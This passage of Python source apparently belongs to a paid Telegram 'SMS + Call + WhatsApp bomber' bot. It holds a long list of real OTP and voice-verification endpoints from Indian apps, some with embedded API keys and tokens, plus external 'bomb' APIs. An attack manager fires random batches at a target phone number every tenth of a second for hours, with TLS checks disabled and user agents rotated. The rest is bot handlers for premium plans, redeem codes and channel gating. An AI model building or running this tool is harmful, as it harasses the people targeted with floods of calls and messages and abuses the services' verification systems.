        {"name":"1MG_Voice","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/3.9.1"},"body":{"number":"{no}","otp_on_call":True}},
        {"name":"1mg_Call","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Accept":"application/vnd.healthkartplus.v11+json","Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/3.9.1"},"body":{"number":"{no}","is_corporate_user":False,"otp_on_call":True}},
        {"name":"Swiggy_Call","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"mobile":"{no}"}},
        {"name":"Myntra_Voice","url":"https://www.myntra.com/gw/mobile-auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Flipkart_Voice","url":"https://www.flipkart.com/api/6/user/voice-otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Paytm_Voice","url":"https://accounts.paytm.com/signin/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Zomato_Voice","url":"https://www.zomato.com/php/o2_api_handler.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"phone={no}&type=voice"},
        {"name":"Zomato_Call","url":"https://accounts.zomato.com/login/phone","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","x-zomato-api-key":"7749b19667964b87a3efc739e254ada2"},"body":{"number":"{no}","country_id":"1","lc":"bed7238d427f41e7a34ea6ea134d2628","type":"initiate","verification_type":"call","package_name":""}},
        {"name":"Ola_Voice","url":"https://api.olacabs.com/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Uber_Voice","url":"https://auth.uber.com/v2/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"+91{no}"}},
        {"name":"Kotak_Voice","url":"https://www.kotak.com/api/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Amazon_Voice","url":"https://www.amazon.in/ap/signin","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"phone={no}&action=voice_otp"},
        {"name":"MakeMyTrip_Voice","url":"https://www.makemytrip.com/api/4/voice-otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Goibibo_Voice","url":"https://www.goibibo.com/user/voice-otp/generate/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"PhonePe_Voice","url":"https://www.phonepe.com/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"BigBasket_Voice","url":"https://www.bigbasket.com/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"BookMyShow_Voice","url":"https://in.bookmyshow.com/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"RedBus_Voice","url":"https://www.redbus.in/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Proptiger_Call","url":"https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call","method":"POST","headers":{"Content-Type":"application/json"},"body":{"contactNumber":"{no}","domainId":"2"}},
        {"name":"Snitch_Voice","url":"https://www.snitch.com/api/auth/resend-otp","method":"POST","params":{"mode":"voice"},"headers":{"Content-Type":"application/json","X-CAP-Token":"1d059f0c33c4d34b:868c9d763b60c83616551acdd002e6"},"body":{"mobile_number":"+{no}"}},
        {"name":"RummyCircle_Voice","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isPlaycircle":False,"otpOnCall":True}},
        {"name":"Refyne_Call","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","method":"POST","headers":{"Content-Type":"application/json","Authorization":"Bearer"},"body":{"channel":"IVR","recipient":"{no}"}},
        {"name":"Hotstar_Call","url":"https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8","method":"POST","params":{"action":"resendOtp","page_enum":"onboarding_login"},"headers":{"Accept":"application/json","Content-Type":"application/json","X-HS-Platform":"mweb","X-Country-Code":"in"},"body":{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","phone_number":"{no}","initiate_by":1,"recaptcha_token":"","source":0}}},
        {"name":"SonyLIV_Voice","url":"https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json","app_version":"3.8.12","device_id":"0add224ff4fc482299eaa626b2dfb424-1788454697165"},"body":{"mobileNumber":"{no}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"2026-09-03T17:00:50.106Z","otpSize":4,"isMobileMandatory":True,"loginType":"REGISTERORSIGNIN"}},
        {"name":"Ixigo_Call","url":"https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","method":"POST","headers":{"Content-type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","apiKey":"iximweb!2$","ixiSrc":"iximweb","clientId":"iximweb","deviceId":"5416efcf017344f9ba6a","uuid":"5416efcf017344f9ba6a"},"body":"token=18506fc6b7db226aeae68f1e32a8f8a3ad8ab4e798180fe0c0735955fe5a15c6f981eb24306db4a1fb5e627df48a298cacd93de8ad0545ab93af16ed5386cc7d&sixDigitOTP=true&prefix=%2B91&phone={no}&resendOnCall=true"},
        {"name":"Practo_Voice","url":"https://accounts.practo.com/send_voice_otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Accept":"application/json","X-Requested-With":"XMLHttpRequest"},"body":"mobile=%2B91{no}&g-recaptcha-response=dummy_token"},
        {"name":"Doubtnut_Call","url":"https://micro.doubtnut.com/otp/send-call","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/5.0.0-alpha.2"},"body":{"phone":"{no}","locale":"en"}},
        {"name":"Call_Bomber_Vercel","url":"https://call-bomber-50k3t8a6r.vercel.app/bomb","method":"GET","params":{"number":"{no}"},"headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"Niloy_Call_API","url":"https://rk-niloy-call-api.vercel.app/api","method":"GET","params":{"phone":"{no}"},"headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"Call_API_Sable","url":"https://call-api-sable.vercel.app/bomb/{no}","method":"GET","headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"Thakur_Call","url":"https://thakur-bombcyber.kundanjha7782.workers.dev/","method":"GET","params":{"mobile":"{no}"},"headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"RK_Niloy_Call","url":"https://rk-niloy-call-api-sigma.vercel.app/api","method":"GET","params":{"phone":"{no}"},"headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"RK_Niloy_Bomb","url":"https://rkniloycall.vercel.app/bomb/{no}","method":"GET","headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"OTP_Bomber_API","url":"https://otp-bomber-api.vercel.app/api","method":"GET","params":{"phone":"{no}"},"headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"BomberQ_API","url":"https://bomberqapis.vercel.app/bomb","method":"GET","params":{"number":"{no}"},"headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"IGP_Earning","url":"https://earning-igp.unaux.com//codes/89EzVmsnYb.php","method":"GET","params":{"num":"{no}"},"headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"Astroyogi_Call_Latest","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","method":"POST","headers":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9.","Accept-Language":"en-US","Accept":"application/json","Content-Type":"application/json"},"body":{"phoneCode":"91","countryCode":"IN","mobileNumber":"{no}","platform":"Web","IpAddress":"117.234.91.204","requestType":"call","countryCodeByHeader":"IN"}},
        {"name":"Astrosage_Call","url":"http://varta.astrosage.com/sdk/send-otp-via-call","method":"GET","params":{"callback":"myCallback","countrycode":"91","phoneno":"{no}","deviceid":"","operation_name":"blank","jsonpcall":"1","fromresend":"0","_":"0"},"headers":{"User-Agent":"Mozilla/5.0","Referer":"http://www.astrosage.com/"},"body":{}},
        {"name":"Astrosage_Register","url":"http://varta.astrosage.com/sdk/registerAS","method":"GET","params":{"callback":"myCallback","countrycode":"91","phoneno":"{no}","deviceid":"","operation_name":"blank","jsonpcall":"1","fromresend":"0","_":"0"},"headers":{"User-Agent":"Mozilla/5.0","Referer":"http://www.astrosage.com/"},"body":{}},
        {"name":"MyAstro","url":"https://myastro.org.in/sendOtpPinnacle","method":"GET","params":{"phone":"{no}"},"headers":{"X-Requested-With":"XMLHttpRequest"},"body":{}},
        {"name":"Bomberr_Call","url":"https://bomberr.onrender.com/num={no}","method":"GET","headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"Milkbasket_Voice","url":"https://consumerbff.milkbasket.com/graphql","method":"POST","headers":{"Content-Type":"application/json","appplatform":"web","appversion":"8.0.9.0"},"body":{"operationName":"registerNumber","variables":{"phone":"{no}","retry":True,"retryType":"voice","appHash":"","udid":"QZg2sH1J6vHLMwDK"},"query":"mutation registerNumber($phone: String!, $retry: Boolean!, $retryType: String!, $appHash: String!, $udid: String!) { registerPhoneNumber(phone: $phone retry: $retry retryType: $retryType appHash: $appHash udid: $udid) { status error errorMsg otpBlockTime __typename } }"}}
    ]
    apis.extend(call)

    # ========== WHATSAPP APIs ==========
    wa = [
        {"name":"KPN_WhatsApp","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate","method":"POST","params":{"channel":"AND","version":"3.2.6"},"headers":{"x-app-id":"66ef3594-1e51-4e15-87c5-05fc8208a20f","content-type":"application/json; charset=UTF-8"},"body":{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{no}"}}},
        {"name":"KPN_WhatsApp_v2","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate","method":"POST","params":{"channel":"WEB","version":"1.0.0"},"headers":{"x-app-id":"d7547338-c70e-4130-82e3-1af74eda6797","content-type":"application/json"},"body":{"phone_number":{"number":"{no}","country_code":"+91"},"notification_channel":"WHATSAPP"}},
        {"name":"Foxy_WhatsApp","url":"https://www.foxy.in/api/v2/users/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"user":{"phone_number":"+91{no}"},"via":"whatsapp"}},
        {"name":"Stratzy_WhatsApp","url":"https://stratzy.in/api/web/whatsapp/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNo":"{no}"}},
        {"name":"Stratzy_Phone_OTP","url":"https://stratzy.in/api/web/auth/sendPhoneOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNo":"{no}"}},
        {"name":"Rappi_WhatsApp","url":"https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","User-Agent":"okhttp/3.9.1"},"body":{"country_code":"+91","phone":"{no}"}},
        {"name":"EkaCare_WhatsApp","url":"https://auth.eka.care/auth/init","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","Client-Id":"androidp","User-Agent":"okhttp/4.9.3"},"body":{"payload":{"allowWhatsapp":True,"mobile":"+91{no}"},"type":"mobile"}},
        {"name":"Meesho_WhatsApp","url":"https://meesho.com/gw/login-register/v1/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"number":"{no}","otpOnCall":True}},
        {"name":"Housing_WhatsApp","url":"https://mightyzeus-mum.housing.com/api/gql","method":"POST","params":{"apiName":"LOGIN_SEND_OTP_API","emittedFrom":"client_buy_home","isBot":"false","platform":"mobile","source":"mobile","source_name":"AudienceWeb"},"headers":{"phoenix-api-name":"LOGIN_SEND_OTP_API","app-name":"mobile_web_buyer","Content-Type":"application/json; charset=UTF-8"},"body":{"query":"mutation($phone: String, $userAgent: String, $otpLength: Int, $preference: String) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength, preference: $preference) { success message } }","variables":{"phone":"{no}","userAgent":"Mozilla/5.0","otpLength":4,"preference":"whatsapp"}}},
        {"name":"Urbanic_WhatsApp","url":"https://api-shop-in.urbanic.com/n/api/buyer/basic/otp/sendCode","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","app_version":"8.41.0.0","client_type":"android-app","x-platform":"android","x-device":"google, Pixel 4","x-os-version":"9"},"body":{"bizTraceId":"be35ec943fee4d58a32727b2adfe9f9f","channel":2,"phonePrefix":"+91","type":0,"userName":"{no}"}},
        {"name":"Refyne_WhatsApp","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","method":"POST","headers":{"Content-Type":"application/json","Authorization":"Bearer"},"body":{"channel":"WHATSAPP","recipient":"{no}"}},
        {"name":"Zomato_WhatsApp","url":"https://accounts.zomato.com/login/phone","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","x-zomato-api-key":"7749b19667964b87a3efc739e254ada2"},"body":{"number":"{no}","country_id":"1","lc":"af07c17656e641efbfcc489f51aea946","type":"initiate","verification_type":"whatsapp","package_name":""}},
        {"name":"EazyDiner_WhatsApp","url":"https://force.eazydiner.com/4.1/otp?medium=android","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Authorization":"Bearer","manual-location":"true","Screen-Width":"720","Build":"378","Medium":"Android"},"body":"mobile=+{no}&whatsapp=1"},
        {"name":"EazyDiner_SMS","url":"https://force.eazydiner.com/4.1/otp?medium=android","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Authorization":"Bearer","manual-location":"true","Screen-Width":"720","Build":"378","Medium":"Android"},"body":"mobile=+{no}"},
        {"name":"Savana_WhatsApp","url":"https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode","method":"POST","headers":{"Content-Type":"application/json;charset=utf-8","x-source":"h5","x-platform":"web","h5-version":"5.6.0","country-language":"en-IN","client_type":"h5","app_version":"5.6.0"},"body":{"userName":"{no}","type":0,"channel":"2","bizTraceId":"93d67a64fa6b4ca4bee136f9a2470d97","phonePrefix":"+91"}},
        {"name":"VisitApp_WhatsApp_v2","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","method":"POST","headers":{"Content-Type":"application/json"},"body":{"channel":"whatsapp","resend":True,"countryCode":91,"phone":"{no}","platform":"WEB"}},
        {"name":"Agoda_WhatsApp","url":"https://www.agoda.com/ul/api/v1/auth","method":"POST","headers":{"ul-fallback-origin":"https://www.agoda.com","ul-app-id":"mspa","Content-Type":"application/json; charset=utf-8"},"body":{"email":"","keepMeSignedIn":False,"whatsapp":"+{no}"}},
        {"name":"Housing3_SMS_v2","url":"https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API","method":"POST","headers":{"Content-Type":"application/json","phoenix-api-name":"LOGIN_SEND_OTP_API","app-name":"mobile_web_buyer"},"body":{"query":"mutation($email:String,$phone:String,$otpLength:Int,$preference:String){sendOtp(phone:$phone,email:$email,otpLength:$otpLength,preference:$preference){success message}}","variables":{"phone":"{no}","otpLength":4,"preference":"whatsapp"}}}
    ]
    apis.extend(wa)

    # Remove duplicates
    seen = set()
    unique = []
    for api in apis:
        key = f"{api.get('url','')}_{api.get('method','')}"
        if key not in seen:
            seen.add(key)
            unique.append(api)

    return unique

APIS = build_api_list()
logger.info(f"✅ Total APIs Loaded: {len(APIS)}")

# ========== DATABASE WRAPPER ==========
class DatabaseWrapper:
    def __init__(self):
        self.db = db
    def __getattr__(self, name):
        return getattr(self.db, name)

database = DatabaseWrapper()
manager = None

# ========== ATTACK MANAGER ==========
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.db = database
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
            "okhttp/3.9.1",
            "okhttp/5.0.0-alpha.2",
        ]
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self._session = None
        self._connector = None

    async def _get_session(self):
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=50, limit_per_host=15, ttl_dns_cache=300, enable_cleanup_closed=True)
            timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
            self._session = aiohttp.ClientSession(connector=self._connector, timeout=timeout)
        return self._session

    async def _close_session(self):
        if self._session and not self._session.closed:
            await self._session.close()
        if self._connector and not self._connector.closed:
            await self._connector.close()
        self._session = None
        self._connector = None

    async def _make_request(self, api, phone):
        try:
            session = await self._get_session()
            url = api['url']
            if callable(url):
                url = url(phone)

            params = api.get('params', {}).copy() if api.get('params') else {}
            if params:
                for k, v in params.items():
                    if isinstance(v, str):
                        params[k] = v.replace('{no}', phone).replace('{phone}', phone)

            headers = api.get('headers', {}).copy()
            if 'User-Agent' not in headers:
                headers['User-Agent'] = random.choice(self.user_agents)

            def rb(body):
                if isinstance(body, dict):
                    return {k: rb(v) if isinstance(v, (dict, list)) else (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) for k, v in body.items()}
                elif isinstance(body, list):
                    return [rb(i) if isinstance(i, (dict, list)) else (i.replace('{no}', phone).replace('{phone}', phone) if isinstance(i, str) else i) for i in body]
                elif isinstance(body, str):
                    return body.replace('{no}', phone).replace('{phone}', phone)
                return body

            body = rb(api.get('body', {}))
            method = api['method'].upper()

            if method == 'GET':
                async with session.get(url, headers=headers, params=params) as resp:
                    await resp.text()
            elif method == 'PUT':
                async with session.put(url, headers=headers, json=body) as resp:
                    await resp.text()
            else:
                if isinstance(body, dict):
                    async with session.post(url, headers=headers, json=body, params=params) as resp:
                        await resp.text()
                else:
                    async with session.post(url, headers=headers, data=body, params=params) as resp:
                        await resp.text()
            return True
        except Exception:
            return False

    async def _worker_task(self, user_id, phone, api_list, end_time):
        while time.time() < end_time:
            if user_id not in self.active_attacks:
                break
            if not self.active_attacks[user_id].get("running", False):
                break
            if phone not in self.active_attacks[user_id].get("targets", []):
                break
            batch_size = min(25, len(api_list))
            batch = random.sample(api_list, batch_size) if len(api_list) > batch_size else api_list
            tasks = [self._make_request(api, phone) for api in batch]
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)

    async def start_attack(self, user_id, targets, duration_minutes):
        if user_id in self.active_attacks:
            return False, "Attack already running"
        if not await self.db.is_premium(user_id):
            return False, "Premium required"
        max_dur = await self.db.get_max_duration(user_id)
        if duration_minutes > max_dur:
            return False, f"Max duration is {max_dur} minutes"
        concurrency = await self.db.get_concurrent_limit(user_id)
        if concurrency == 0:
            return False, "Premium required"
        if len(targets) > concurrency:
            return False, f"Max {concurrency} concurrent targets allowed"
        for target in targets:
            if await self.db.is_protected(target):
                return False, f"Number {target} is protected!"

        end_time = time.time() + (duration_minutes * 60)
        max_workers = min(concurrency, 5)
        self.active_attacks[user_id] = {"targets": targets, "end_time": end_time, "running": True, "workers": {}}

        chunk_size = max(1, len(APIS) // max_workers)
        chunks = []
        for i in range(max_workers):
            s = i * chunk_size
            e = s + chunk_size if i < max_workers - 1 else len(APIS)
            chunks.append(APIS[s:e])

        for target in targets:
            self.active_attacks[user_id]["workers"][target] = []
            for i in range(max_workers):
                task = asyncio.create_task(self._worker_task(user_id, target, chunks[i], end_time))
                self.active_attacks[user_id]["workers"][target].append(task)

        return True, f"Started attack on {len(targets)} target(s)"

    async def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            for tw in self.active_attacks[user_id].get("workers", {}).values():
                for t in tw:
                    if not t.done():
                        t.cancel()
            await asyncio.sleep(0.5)
            del self.active_attacks[user_id]
            await self._close_session()
            return True
        return False

    async def check_working_apis(self, phone="9999999999"):
        working = []
        failed = []
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=20, limit_per_host=5)
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tested = 0
            for api in APIS:
                tested += 1
                try:
                    url = api['url']
                    if callable(url):
                        url = url(phone)
                    headers = api.get('headers', {}).copy()
                    if 'User-Agent' not in headers:
                        headers['User-Agent'] = random.choice(self.user_agents)

                    def rb(body):
                        if isinstance(body, dict):
                            return {k: rb(v) if isinstance(v, (dict, list)) else (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) for k, v in body.items()}
                        elif isinstance(body, list):
                            return [rb(i) if isinstance(i, (dict, list)) else (i.replace('{no}', phone).replace('{phone}', phone) if isinstance(i, str) else i) for i in body]
                        elif isinstance(body, str):
                            return body.replace('{no}', phone).replace('{phone}', phone)
                        return body

                    body = rb(api.get('body', {}))
                    params = api.get('params', {}).copy() if api.get('params') else {}
                    if params:
                        for k, v in params.items():
                            if isinstance(v, str):
                                params[k] = v.replace('{no}', phone)
                    method = api['method'].upper()

                    if method == 'GET':
                        async with session.get(url, headers=headers, params=params) as resp:
                            if resp.status == 200: working.append(api['name'])
                            else: failed.append(api['name'])
                    elif method == 'PUT':
                        async with session.put(url, headers=headers, json=body) as resp:
                            if resp.status == 200: working.append(api['name'])
                            else: failed.append(api['name'])
                    else:
                        if isinstance(body, dict):
                            async with session.post(url, headers=headers, json=body, params=params) as resp:
                                if resp.status == 200: working.append(api['name'])
                                else: failed.append(api['name'])
                        else:
                            async with session.post(url, headers=headers, data=body, params=params) as resp:
                                if resp.status == 200: working.append(api['name'])
                                else: failed.append(api['name'])
                except Exception:
                    failed.append(api['name'])
                if tested % 10 == 0:
                    await asyncio.sleep(0.5)
        return working, failed

# ========== BOT HANDLERS ==========
async def check_channel_join(update, context):
    uid = update.effective_user.id
    if uid == OWNER_ID:
        return True
    channel = await manager.db.get_channel()
    if not channel:
        return True
    c = channel.strip()
    for pfx in ["https://", "http://", "t.me/"]:
        if c.startswith(pfx):
            c = c.replace(pfx, "", 1)
    c = c.lstrip("@").split("?")[0].split("/")[0].strip()
    if not c:
        return True
    try:
        m = await context.bot.get_chat_member(c, uid)
        if m.status in ("member", "administrator", "creator"):
            return True
    except Exception:
        pass
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{c}")]])
    msg = f"⛔ ACCESS DENIED!\n\n❌ Aapko hamara channel join karna hoga:\n\n👉 t.me/{c}\n\n✅ Join ke baad /start dobara dabayein."
    try:
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(msg, reply_markup=kb)
        else:
            await update.message.reply_text(msg, reply_markup=kb)
    except Exception:
        pass
    return False

async def web_server():
    from aiohttp import web
    async def handle(request):
        return web.Response(text="Bot is Alive!")
    app = web.Application()
    app.router.add_get('/', handle)
    app.router.add_get('/health', lambda r: web.Response(text="OK"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"🌐 Web Server running on port {PORT}")

def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
        [KeyboardButton("🔑 /redeem"), KeyboardButton("📩 /contact")],
        [KeyboardButton("❓ /help")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

async def multi_target_kb(user_id):
    max_t = await manager.db.get_concurrent_limit(user_id)
    btns = [[InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")] for i in range(1, min(max_t, 10) + 1)]
    btns.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(btns)

async def duration_kb(user_id):
    max_d = await manager.db.get_max_duration(user_id)
    con = await manager.db.get_concurrent_limit(user_id)
    btns = []
    row = []
    for m in [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]:
        if m <= max_d:
            label = f"{m}min" if m < 60 else ("1h" if m == 60 else f"{m//60}h")
            row.append(InlineKeyboardButton(label, callback_data=f"dur_{m}"))
            if len(row) == 3:
                btns.append(row)
                row = []
    if row:
        btns.append(row)
    btns.append([InlineKeyboardButton(f"⚡ {con}x Concurrent", callback_data="info")])
    btns.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(btns)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    await manager.db.add_user(uid)
    await update.message.reply_photo(WELCOME_IMAGE, caption=f"🔥 Welcome to Premium Multi-Target Bomber!\n\n📡 Total APIs: {len(APIS)}\n🎯 SMS + Call + WhatsApp\n\nUse /help for commands.", reply_markup=main_kb(uid))

async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if not await manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium Required!\nUse /plan or /redeem")
        return
    if uid in manager.active_attacks:
        await update.message.reply_text("⚠️ Attack already running! Use /status")
        return
    max_t = await manager.db.get_concurrent_limit(uid)
    await update.message.reply_text(f"📞 Select targets (Max: {max_t}):", reply_markup=await multi_target_kb(uid))
    context.user_data['waiting_for_target_count'] = True

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if uid in manager.active_attacks:
        i = manager.active_attacks[uid]
        left = int((i['end_time'] - time.time()) / 60)
        await update.message.reply_text(f"🔥 ATTACK RUNNING\n🎯 Targets: {', '.join(i['targets'])}\n📊 Count: {len(i['targets'])}\n⏳ Left: {left} min",
                                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="stop")]]))
    else:
        await update.message.reply_text("💤 No active attacks.")

async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    plan = await manager.db.get_plan_name(uid)
    expiry = await manager.db.get_expiry(uid)
    con = await manager.db.get_concurrent_limit(uid)
    max_d = await manager.db.get_max_duration(uid)
    await update.message.reply_text(f"👤 ACCOUNT\n🆔 {uid}\n📋 Plan: {plan}\n📅 Expiry: {expiry}\n⚡ Targets: {con}\n⏰ Max: {max_d}min")

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    msg = "💳 AVAILABLE PLANS\n\n"
    for k, p in PLANS.items():
        msg += f"🔹 {p['name']} (₹{p['price']})\n   • {p['days']} Days\n   • {p['concurrent']} Concurrent\n   • {p['max_duration']}min Max\n\n"
    msg += "💡 Use /redeem or /contact"
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("📩 Contact Admin", callback_data="contact_admin")]])
    await update.message.reply_text(msg, reply_markup=kb)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    await update.message.reply_text("🔑 Send your code (Format: PREMIUM-XXXXXXXX):")
    context.user_data['waiting_for_redeem'] = True

async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if not await manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium required!")
        return
    await update.message.reply_text("🛡 Send 10-digit number to protect:")
    context.user_data['waiting_for_protect'] = True

async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    await manager.db.unprotect(uid)
    await update.message.reply_text("🔓 Unprotected.")

async def contact_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if await manager.db.is_contact_blocked(uid):
        await update.message.reply_text("🚫 You are blocked.")
        return
    await update.message.reply_text("📩 Send your message. /cancel to cancel.")
    context.user_data['waiting_for_contact_msg'] = True

async def reply_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or len(args) < 2:
        await update.message.reply_text("Usage: /reply <user_id> <message>")
        return
    tid = args[0]
    msg = " ".join(args[1:])
    if not tid.isdigit():
        await update.message.reply_text("❌ Invalid user ID.")
        return
    try:
        await context.bot.send_message(int(tid), f"📬 Admin Reply:\n\n{msg}")
        await update.message.reply_text(f"✅ Sent to {tid}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")

